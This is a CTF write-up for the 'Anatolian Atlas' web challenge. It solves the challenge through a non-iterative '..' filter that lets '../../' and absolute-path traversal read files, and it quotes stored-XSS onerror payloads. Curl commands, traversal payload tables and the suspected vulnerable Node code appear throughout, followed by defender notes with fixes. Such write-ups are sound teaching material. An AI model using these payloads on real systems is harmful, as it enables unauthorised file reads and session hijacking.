<!-- writeup by Abdelkader -->
<!-- standalone repo: https://github.com/Abdelkad3r/hasblctf-2026/tree/main/web/anatolian-atlas -->
<!-- (full solve.py and handout/ live there) -->

# Anatolian Atlas (web)

| Field    | Value                                                          |
| -------- | -------------------------------------------------------------- |
| Category | web                                                            |
| URL      | `http://34.77.68.154:10202/`                                   |
| Server   | Express.js (Node) on Node, `connect.sid` server-side sessions  |
| Flag     | `HASBL{7urkish_F00ds_4r3_D3lici0us}`                           |

## Description

> A well-known restaurant chain in Türkiye has launched a website where
> all of their restaurants across the country can be rated on a map.
> Can you find the vulnerability in this site?

The bug is a path-traversal at `/files?path=…` whose filter is
non-iterative — `../flag_info.txt` is rejected but `../../flag_info.txt`
walks straight out of the base directory. The leaked file is a recipe
that names a Kayseri restaurant review with very specific scores; once
that exact review exists in your session, `/api/restaurant/kayseri`
starts returning a `flag` field.

## TL;DR

```
# 1. register + login (sessions are server-side)
$ curl -c jar -d 'username=u&password=p&next=/' http://…:10202/register
$ curl -b jar -c jar -d 'username=u&password=p&next=/' http://…:10202/login

# 2. path traversal with a non-iterative `..` filter
$ curl 'http://…:10202/files?path=../flag_info.txt'        # 404 Not found
$ curl 'http://…:10202/files?path=../../flag_info.txt'     # 200, reads /app/flag_info.txt
$ curl 'http://…:10202/files?path=/app/flag_info.txt'      # 200, confirms no base-prefix check

# 3. the leak is a recipe — execute it as a logged-in user
$ curl -b jar -X POST -d 'service=3&food=5&hygiene=4&comment=Give me the flag!' \
       http://…:10202/review/kayseri

# 4. the flag now appears in the restaurant API
$ curl -b jar http://…:10202/api/restaurant/kayseri | jq -r .flag
HASBL{7urkish_F00ds_4r3_D3lici0us}
```

## Recon

### Step 1 — surfacing the attackable endpoints

The unauthenticated homepage already exposes three interesting URLs:

```html
<img class="turkiye-map" src="/files?path=turkiye.png" alt="Map of Turkiye" />
…
<button class="pin" data-id="istanbul" data-city="Istanbul" …></button>   ← 18 city pins
…
<script src="/js/app.js"></script>
```

and `/js/app.js` documents the rest of the API:

```js
fetch(`/api/restaurant/${id}`).then(r => r.json()).then((payload) => {
  …
  if (payload.flag) { panelFlag.querySelector("span").textContent = payload.flag; }
  …
  if (payload.loggedIn) { reviewForm.action = `/review/${payload.restaurant.id}`; }
});
```

So the flag lives in the JSON of `/api/restaurant/:id`, conditionally;
reviews are posted to `/review/:id`; and `/files?path=…` is a raw
filesystem reader. Three attack candidates — only one is the bug.

### Step 2 — ruling out the noisy distractor

The `comment` field in each review is rendered into the panel by
template-literal `innerHTML` concatenation:

```js
reviewList.innerHTML = reviews.map((r) =>
  `<article class="review"> … <p>${r.comment}</p> … </article>`
).join("");
```

That is stored-XSS-shaped, and competitor traffic in `/api/restaurant/istanbul`
confirms other players have noticed: the thread is full of
`<img src=x onerror=fetch('/api/restaurant/istanbul').then(r=>r.json()).then(d=>{if(d.flag)…})>`
payloads aimed at exfiltrating a hypothetical admin's flag. But there's
no admin bot here; the XSS only fires in *your own* browser, against
a restaurant whose `flag` field is null for everyone. Dead end.

### Step 3 — enumerating all cities, finding no flag-bearer

```
$ for c in adana ankara antalya balikesir bursa corum diyarbakir erzurum
           eskisehir gaziantep istanbul izmir kayseri konya mardin samsun
           trabzon van; do
    curl -s http://…:10202/api/restaurant/$c | grep -oE '"flag":"[^"]+"' || echo "$c: no-flag"
  done
adana: no-flag
ankara: no-flag
…
van: no-flag
```

None of the 18 restaurants surfaces a flag unauthenticated. So the flag
is conditioned on either authentication or a review-side action — keep
moving.

### Step 4 — the authenticated-only hint

Register an account, log in, fetch the homepage as the authenticated
user, diff against the anonymous version. The new lines worth caring
about:

```html
<span class="user-chip">Hi, ataylan_…</span>
…
    <!-- Hint: flag_info.txt exists somewhere outside the public docs. -->
    <div class="map-shell">
      <img class="turkiye-map" src="/files?path=turkiye.png" …/>
```

The HTML comment is *only emitted to logged-in sessions*. That's the
breadcrumb: there's a file called `flag_info.txt`, it lives outside
the public dir, and the only reader on the server you can talk to is
`/files`.

### Step 5 — the non-iterative `..` filter

Naïve traversal is blocked:

| `path=` value                    | code | size |
|----------------------------------|------|------|
| `turkiye.png`                    | 200  | 208 082 |
| `./turkiye.png`                  | 200  | 208 082 |
| `flag_info.txt`                  | 404  | 9 |
| `../flag_info.txt`               | 404  | 9 |
| `..%2fflag_info.txt`             | 404  | 9 |
| `....//flag_info.txt`            | 404  | 9 |
| `%2e%2e/flag_info.txt`           | 404  | 9 |
| `turkiye.png%00../flag_info.txt` | 404  | 9 |
| **`../../flag_info.txt`**        | **200** | **236** |
| **`/app/flag_info.txt`**         | **200** | **236** |

The split between `../` (404) and `../../` (200) is diagnostic. It rules
out the obvious correct fix — *resolve to an absolute path and check
that it starts with the base directory*, which would reject both. It
also rules out a literal-substring rejection of `..`, which would
reject both. The behaviour matches a **non-iterative substring strip**:

```js
// suspected server code
const safe = req.query.path.replace('..', '');     // no /g flag
res.sendFile(path.join(BASE_DIR, safe));           // joins, doesn't validate
```

- `../flag_info.txt`     → strip first `..` → `/flag_info.txt` → joined under
  base, file doesn't exist there → 404.
- `../../flag_info.txt`  → strip first `..` → `/../flag_info.txt` → joined,
  the surviving `..` escapes the base → 200.
- `/app/flag_info.txt`   → no `..` to strip → joined ends up
  resolving to the absolute path (`path.join('/app/public/files',
  '/app/flag_info.txt')` collapses to `/app/flag_info.txt` in Node) →
  200.

That the *absolute path* also works confirms there is no
`startsWith(base)` check anywhere — the resolved path is sent
verbatim. Both bypasses are symptoms of the same missing line.

### Step 6 — reading the leak

```
$ curl -s 'http://…:10202/files?path=../../flag_info.txt'
If you can read this file, you are close.

To reveal the flag:
- Go to the Kayseri restaurant.
- Set service to 3, food to 5, and hygiene to 4.
- Write the comment exactly as: "Give me the flag!"
- Submit the review to reveal the flag.
```

So the flag isn't *in* `flag_info.txt`. The file is a server-side
puzzle key: the API's flag field is gated on the existence of a
specific review tuple `(3, 5, 4, "Give me the flag!")` against
`kayseri`. Read as code:

```js
// suspected gating in the restaurant API
if (
  reviews.some(r =>
    r.restaurant === 'kayseri' &&
    r.service === 3 && r.food === 5 && r.hygiene === 4 &&
    r.comment === 'Give me the flag!')
) {
  payload.flag = FLAG;
}
```

### Step 7 — submit, then read

```
$ curl -b jar -X POST \
    --data-urlencode service=3 --data-urlencode food=5 \
    --data-urlencode hygiene=4 --data-urlencode 'comment=Give me the flag!' \
    http://…:10202/review/kayseri
HTTP/1.1 302 Found
Location: /?city=kayseri

$ curl -b jar http://…:10202/api/restaurant/kayseri | jq -r .flag
HASBL{7urkish_F00ds_4r3_D3lici0us}
```

## Flag

```
HASBL{7urkish_F00ds_4r3_D3lici0us}
```

(*"Turkish foods are delicious"* — fitting for a restaurant-map
challenge whose pins are spread across Anatolia.)

## Defender notes

* **Don't blacklist `..`. Resolve, then verify the prefix.** The
  one-line correct fix in Node is:

  ```js
  const resolved = path.resolve(BASE_DIR, req.query.path);
  if (!resolved.startsWith(BASE_DIR + path.sep)) return res.status(404).send('Not found');
  res.sendFile(resolved);
  ```

  This survives `..`, `....//`, URL-encoded variants, absolute paths,
  null bytes, and symlinks (with `realpath` you also survive
  symlink-aimed traversal). Filtering substrings of `..` instead is
  a category of bug, not a specific oversight — the next attacker
  finds whatever variant the filter forgot.

* **`String.prototype.replace` without the `/g` flag is the canonical
  non-iterative strip.** This bug pattern shows up in linters as a
  high-confidence security finding (e.g. ESLint's
  `security/detect-non-literal-regexp` is the wrong rule, but
  `no-non-iterative-replace` style audits catch it). Static analysis
  for `replace('..', '')` / `replace(/\.\.\//, '')` without `/g` is
  worth adding to any traversal-adjacent CR pipeline.

* **An absolute-path bypass on the same endpoint tells you the
  resolved path is unchecked.** Even if the dev had fixed the `..`
  filter, `path=/app/flag_info.txt` would still work, because
  `path.join` and `path.resolve` collapse to the absolute argument
  if it's absolute. The `startsWith` check is the only durable
  defence; the `..` filter is at best defence in depth.

* **Don't put hint text in HTML comments.** The
  `<!-- Hint: flag_info.txt … -->` is helpful CTF scaffolding but, in
  a real system, an HTML comment served to authenticated users is
  *every authenticated user's view*. View-source on any browser
  reveals it; archives like the Wayback Machine preserve it; CDN
  edges may cache the authenticated variant by accident. Hints
  belong in an admin-only resource, not in the response body served
  to every logged-in stranger.

* **`flag_info.txt` next to your app code is operational data
  leakage.** Even for the CTF intent (a recipe rather than the flag
  itself), shipping any file with `flag_info.txt` in its name inside
  the working directory means *every* unbounded file reader on the
  server stub (path traversal, log exposure, accidental directory
  listing, `node_modules` symlink, `npm pack` tarball uploads) hands
  it out. In production: never store secrets in the working tree;
  keep them in the orchestrator's secret store and inject as env
  vars.

* **`innerHTML` on user-controlled `comment` is a separate, real
  XSS bug.** Even though the intended solution doesn't use it,
  rendering comments through template-literal `innerHTML` lets one
  user run JS in another user's session. The fact that competitor
  payloads already exist in the database
  (`<img src=x onerror=fetch('/api/restaurant/…')…>`) means *every*
  visitor to the Istanbul thread runs them. The fix is `textContent`
  for the inner content, plus DOM-based construction (`document.createElement`,
  `el.textContent = …`) rather than string concatenation. The reason
  this bug doesn't pay off in this CTF is that nothing privileged
  ever loads the page; in a real app with an admin moderating
  reviews, this is a one-shot account takeover.

* **The reward-action puzzle (specific review → flag in API) is a
  reasonable CTF gimmick.** It rewards reading the recipe end to end
  and avoids drive-by solves. In production terms it's a "magic
  values" anti-pattern (server behaviour depends on a specific
  string that's documented in a file the server hands out for
  free), so the lesson generalises: any code path that emits a
  secret on a magic-input match should *also* require strong
  authentication and rate-limiting.

## Files

* [`solve.py`](https://github.com/Abdelkad3r/hasblctf-2026/blob/main/web/anatolian-atlas/solve.py) — argparse-driven solver. Registers a
  random user, logs in, traverses `/files?path=../../flag_info.txt`
  to confirm the leak, posts the magic review to `/review/kayseri`,
  reads `/api/restaurant/kayseri`, and prints the flag.
  Standard-library only (`urllib.request`, `http.cookiejar`).
* [`handout/index_anon.http`](https://github.com/Abdelkad3r/hasblctf-2026/blob/main/web/anatolian-atlas/handout/index_anon.http) — the
  anonymous homepage response (headers + body).
* [`handout/index_auth.html`](https://github.com/Abdelkad3r/hasblctf-2026/blob/main/web/anatolian-atlas/handout/index_auth.html) — the
  authenticated homepage with the
  `<!-- Hint: flag_info.txt … -->` comment.
* [`handout/app.js`](https://github.com/Abdelkad3r/hasblctf-2026/blob/main/web/anatolian-atlas/handout/app.js) — the front-end JS describing
  the API surface (`/api/restaurant/:id`, `/review/:id`, the
  `panelFlag` field).
* [`handout/login.html`](https://github.com/Abdelkad3r/hasblctf-2026/blob/main/web/anatolian-atlas/handout/login.html),
  [`handout/register.html`](https://github.com/Abdelkad3r/hasblctf-2026/blob/main/web/anatolian-atlas/handout/register.html) — the auth
  forms.
* [`handout/flag_info.txt`](https://github.com/Abdelkad3r/hasblctf-2026/blob/main/web/anatolian-atlas/handout/flag_info.txt) — the leaked
  recipe file, exactly as the server returned it.

## Requirements

Python 3.9+; standard library only.
